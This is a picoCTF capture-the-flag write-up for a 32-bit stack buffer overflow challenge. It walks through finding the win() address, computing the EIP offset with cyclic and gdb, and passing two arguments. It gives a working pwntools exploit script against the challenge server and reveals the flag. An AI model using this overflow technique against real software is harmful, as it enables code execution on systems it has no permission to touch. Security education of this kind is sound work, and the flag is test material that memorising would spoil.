# Buffer Overflow 2

## Write-Up

### Introduction

From the `vuln.c` source code, we can see that this challenge is similar to the previous one (Biffer Overflow 1) in terms of vulnerability exploit of the **Buffer Overflow** to jump to the `win()` function. This time, we need to pass the arguments of the function or order to print the flag.

We can see that we need to set the args to the following :

```
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D
```

### Tools used

 - `gdb`
 - `gef` : pritifying of `gdb`, see : https://github.com/hugsy/gef 
 - `nm` : extract addresses of functions inside a binary
 - `cyclic` : gives a bytes cycle sequence to overwrite pointers and variables with.
 - `pwn tools` : binary exploitation tools library of python
 - `gcc-multilib` : this C Compiler enables you to compile C programs to ELF 32-bits or 64-bits, here is how to install it :
   - `sudo apt-get install gcc-multilib`
   - Don't Forget to visit : https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/

### Explanation of the attack :

When seeing the code, we can that the vuln functions reads a buffer, and then normally get back to the main function to continue the execution. Our goal here is to try to overwrite pointers and variables but to make the program jump to the `win()` function so we can print out the flag, and that by causing a **segmentation fault**.

To do that we can try to access a part of the memory that we dont have the right to like pointers of the stack ..., and we can use gets and its vulnerability to do that.

First, we need to get the following informations :

 - **Adresse of the win() function in the binary** : which is static in this case, we can do that using the `nm` command : 

```
nm vuln
```

Here is the result

```
0804c03c B __bss_start
0804c03c b completed.7623
0804c034 D __data_start
0804c034 W data_start
080491e0 t deregister_tm_clones
080491c0 T _dl_relocate_static_pie
08049260 t __do_global_dtors_aux
0804bf0c d __do_global_dtors_aux_fini_array_entry
0804c038 D __dso_handle
0804bf10 d _DYNAMIC
0804c03c D _edata
0804c040 B _end
         U exit@@GLIBC_2.0
         U fgets@@GLIBC_2.0
0804946c T _fini
         U fopen@@GLIBC_2.1
0804a000 R _fp_hw
08049290 t frame_dummy
0804bf08 d __frame_dummy_init_array_entry
0804a244 r __FRAME_END__
         U getegid@@GLIBC_2.0
         U gets@@GLIBC_2.0
0804c000 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
0804a080 r __GNU_EH_FRAME_HDR
08049000 T _init
0804bf0c d __init_array_end
0804bf08 d __init_array_start
0804a004 R _IO_stdin_used
08049460 T __libc_csu_fini
080493f0 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
08049372 T main
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
08049220 t register_tm_clones
         U setresgid@@GLIBC_2.0
         U setvbuf@@GLIBC_2.0
08049180 T _start
         U stdout@@GLIBC_2.0
0804c03c D __TMC_END__
08049338 T vuln
08049296 T win
08049465 T __x86.get_pc_thunk.bp
080491d0 T __x86.get_pc_thunk.bx
```

More precisely : 

```
...
08049338 T vuln
08049296 T win
08049465 T __x86.get_pc_thunk.bp
...
```
This address will help us specify to the `eip` pointer where to jumb back (contexte restetution) after finishing with the `vuln` function.

**Note :** EIP is a register in x86 architectures (32bit). It holds the "Extended Instruction Pointer" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.

 - **Number of characters needed to overwrite pointers:** Next thing to do is to get the number of characters needed to overwrite the `eip` pointer, to do that we will use `gdb` and `cyclyc` tools :

Fist, generate and random length string using `cyclic 120`. Note that the given lengh is bigger then the read buffer size

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
```

After that, we run the `vuln` binary in `gdb` and give it our generated string. Notice in the `eip` pointer the string part specified as nesxt instruction address : 


```
GNU gdb (Debian 12.1-3) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x79      
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xf7e229b4  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffcc90  →  "eaab"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0xffffcd74  →  0xffffcf70  →  "/home/rivench/Documents/picoCTF/pwn/buffer_overflo[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc90│+0x0000: "eaab"       ← $esp
0xffffcc94│+0x0004: 0xf7fbf600  →  0x00000000
0xffffcc98│+0x0008: 0xf7fbfb10  →  0xf7c1ac8a  →  "GLIBC_PRIVATE"
0xffffcc9c│+0x000c: 0x000003e8
0xffffcca0│+0x0010: 0xffffccc0  →  0x00000001
0xffffcca4│+0x0014: 0xf7e20ff4  →  0x00220d8c
0xffffcca8│+0x0018: 0xf7ffd020  →  0xf7ffda40  →  0x00000000
0xffffccac│+0x001c: 0xf7c213b5  →   add esp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x62616164 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  exit
```

we can see that it took "laaa" as the address where to go to for contexte restitution. To get the characters needed to overwrite the `eip` pointer then we needed to give `cyclic` command the sustring that the pointer was overwritend with :

```
cyclic -l daab
```

Here is the result

```
112
```

So we need to generate 112 characters to arrive to the `eip` pointer, then give it the address we want so it jumbs to it after finishing with the vuln function.

```
cyclic 112
```

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab
```

Now that we have th information we needed, we can create our script that exploit the vulnerability in the source code. we will be using `pwn` tools for that : 

 - First, get the byte version of the address found of the `win()` function, we need also to get the byte version of the arguments so we can pass them accordingly with the address :

```python
# Python 3.10.8 (main, Oct 24 2022, 10:07:16) [GCC 12.2.0] on linux
# Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x08049296)
b'\x96\x92\x04\x08'
>>> p32(0xCAFEF00D)
b'\r\xf0\xfe\xca'
>>> p32(0xF00DF00D)
b'\r\xf0\r\xf0'
```

**Notes :**

 - The `\r` character will not be read as a hex value but as a chariot return, to have a correct reading from the program, we need to translate it manually :

   - `\r` => `\x0d`

 - You may need to do some local tests on your computer by changing the given source code, to do that follow these steps :
   - Check for the file ELF (EXEC) (Executable and Linkable Format) :

```
└─$ file vuln     
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1c57f0cbd109ed51024baf11930a5364186c28df, for GNU/Linux 3.2.0, not stripped
```
   - Indeed, we need a 32-bits compiler. So, after modifyinh your `vuln.c` code, here is how you compile it :

```
gcc vuln.c -m32 -o vuln2
```
   - Don't forget also to check the security of the binary given :

```
└─$ checksec vuln 
[*] '/home/rivench/Documents/picoCTF/pwn/buffer_overflow_2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

   - As you can see, the PIE option is disabled, so here is how your compilation command becomes :

```
gcc vuln.c -m32 -no-pie -o vuln2
```

   - Finally, you get your new binary code `vuln2` (Don't forget to check for the new Address of the `win()` function and the cyclyc chars)

```
>>> from pwn import *
>>> p32(0x080491d6)
b'\xd6\x91\x04\x08'
```

From here, you can start creating your exploit. Two option to solve this challenge :

 - **Using gdb :** you can use gdb by running the binary and pass to it the file that contains the overflow string :

```
└─$ python3          
Python 3.10.8 (main, Oct 24 2022, 10:07:16) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> imp = open('text.txt')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
FileNotFoundError: [Errno 2] No such file or directory: 'text.txt'
>>> imp = open('text.txt', wb)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'wb' is not defined
>>> imp = open('text.txt', 'wb')
>>> imp.write(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\x13\x12\x00\x00')
116
>>> exit()
```

```
┌──(rivench㉿kali)-[~/Documents/picoCTF/pwn/buffer_overflow_2]
└─$ gdb vuln2
...
gef➤  r < ./text.txt
```

 - The next option is to use `pwntools` , send the character sequence generated followed by the address we want to overwrite the `eip` pointer with, added arguments value with it. Note that :
   - A separator (you can use null bytes `\x00\x00\x00\x00`) must be added between the function address and arguments
   - Before adding the arguments, check the calling convention for 32-bits binaries :

```
...
Function Address
Nth Argument
N-1th Argument
...
1st Argument
```

We can create a python script for that : 

```python
#! /usr/bin/python3


from pwn import *

HOST = 'saturn.picoctf.net'
PORT = 62302

p = remote(HOST, PORT)

p.sendlineafter(b'Please enter your string: \n', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04\x08\x00\x00\x00\x00\x0d\xf0\xfe\xca\x0d\xf0\x0d\xf0')
p.interactive()
```

After executing that code, first, the pointers will be overwrited of the `vuln` program but we will find that the `eip` pointer will be overwrittend with our specific address, this will make him jump to the `win()` instead of returning to the main function, and after passing checks and execute prints out the flag.

**Note :** in order to run `vuln` binary, add execution permissions to it.

## Flag

picoCTF{argum3nt5_4_d4yZ_31432deb}

## More information :

https://0xrick.github.io/binary-exploitation/bof3/?fbclid=IwAR2Mppoig0o57gQUBm1YQIGH44tBtqWeRB3Jr56RrAFlTzq96qFj5WR_vp8
https://courses.cs.washington.edu/courses/cse374/18sp/lectures/20-buffer-overflows.html?fbclid=IwAR04qbKpLA2emy0_RunFvULwi2qXYSR8-9WtdsawX-bvM5DNWi4l187gOwA
https://security.stackexchange.com/questions/172053/how-to-pass-parameters-with-a-buffer-overflow?fbclid=IwAR3PLNV40nBPjhyleXTOnxpZneH-6-cYn-NyxXcXcB_pAXoYRRmzOodOmKU
https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html
https://en.wikipedia.org/wiki/X86_calling_conventions
https://www.google.com/search?q=buffer+overflow+32+bits+calling+convention&client=firefox-b-e&ei=qy11Y8WQK4GskdUPk82UiAI&oq=buffer+overflow+32+bits+calling+conve&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAxgBMgUIIRCgATIFCCEQoAEyBQghEKABOgoIABBHENYEELADOgYIABAWEB46BAghEBU6CAghEBYQHhAdOgcIIRCgARAKSgQIQRgASgQIRhgAUJUCWK8nYNs6aAFwAXgAgAHYA4gBoiCSAQgyLTEwLjIuMpgBAKABAcgBCMABAQ&sclient=gws-wiz-serp
https://www.0x0ff.info/2021/advanced-buffer-overflow-bypass-aslr-32-bits/
